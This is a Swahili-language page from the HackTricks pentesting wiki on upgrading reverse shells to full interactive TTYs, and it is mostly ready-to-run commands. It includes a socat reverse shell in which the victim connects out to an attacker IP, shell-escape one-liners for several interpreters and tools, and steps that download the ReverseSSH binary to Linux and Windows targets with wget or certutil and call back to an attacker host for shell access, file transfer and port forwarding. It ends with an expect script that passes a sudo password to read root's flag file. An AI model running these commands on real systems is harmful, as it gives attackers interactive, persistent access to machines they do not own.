# Full TTYs

{{#include ../../banners/hacktricks-training.md}}

## Full TTY

Kumbuka kwamba shell uliyoweka katika mabadiliko ya `SHELL` **lazima** iwe **imeorodheshwa ndani ya** _**/etc/shells**_ au `The value for the SHELL variable was not found in the /etc/shells file This incident has been reported`. Pia, kumbuka kwamba vipande vifuatavyo vinatumika tu katika bash. Ikiwa uko katika zsh, badilisha kuwa bash kabla ya kupata shell kwa kukimbia `bash`.

#### Python
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
> [!NOTE]
> Unaweza kupata **nambari** ya **safu** na **nguzo** kwa kutekeleza **`stty -a`**

#### script
```bash
script /dev/null -qc /bin/bash #/dev/null is to not store anything
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
#### socat
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
### **Spawn shells**

- `python -c 'import pty; pty.spawn("/bin/sh")'`
- `echo os.system('/bin/bash')`
- `/bin/sh -i`
- `script -qc /bin/bash /dev/null`
- `perl -e 'exec "/bin/sh";'`
- perl: `exec "/bin/sh";`
- ruby: `exec "/bin/sh"`
- lua: `os.execute('/bin/sh')`
- IRB: `exec "/bin/sh"`
- vi: `:!bash`
- vi: `:set shell=/bin/bash:shell`
- nmap: `!sh`

## ReverseSSH

Njia rahisi ya kupata **interactive shell access**, pamoja na **file transfers** na **port forwarding**, ni kuweka server ya ssh iliyo na uhusiano wa moja kwa moja [ReverseSSH](https://github.com/Fahrj/reverse-ssh) kwenye lengo.

Hapa kuna mfano wa `x86` wenye binaries zilizoshinikizwa na upx. Kwa binaries nyingine, angalia [releases page](https://github.com/Fahrj/reverse-ssh/releases/latest/).

1. Andaa mahali ili kukamata ombi la port forwarding la ssh:
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -v -l -p 4444
```
- (2a) Lengo la Linux:
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
```
- (2b) Lengo la Windows 10 (kwa toleo za awali, angalia [project readme](https://github.com/Fahrj/reverse-ssh#features)):
```bash
# Drop it via your preferred way, e.g.
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

reverse-ssh.exe -p 4444 kali@10.0.0.2
```
- Ikiwa ombi la kupeleka bandari ya ReverseSSH lilifanikiwa, sasa unapaswa kuwa na uwezo wa kuingia kwa kutumia nenosiri la kawaida `letmeinbrudipls` katika muktadha wa mtumiaji anayekimbia `reverse-ssh(.exe)`:
```bash
# Interactive shell access
ssh -p 8888 127.0.0.1

# Bidirectional file transfer
sftp -P 8888 127.0.0.1
```
## Penelope

[Penelope](https://github.com/brightio/penelope) inasasisha kiotomatiki Linux reverse shells kuwa TTY, inashughulikia ukubwa wa terminal, inarekodi kila kitu na mengi zaidi. Pia inatoa msaada wa readline kwa Windows shells.

![penelope](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)

## No TTY

Ikiwa kwa sababu fulani huwezi kupata TTY kamili unaweza **bado kuingiliana na programu** zinazotarajia pembejeo ya mtumiaji. Katika mfano ufuatao, nenosiri linapitishwa kwa `sudo` kusoma faili:
```bash
expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```
{{#include ../../banners/hacktricks-training.md}}
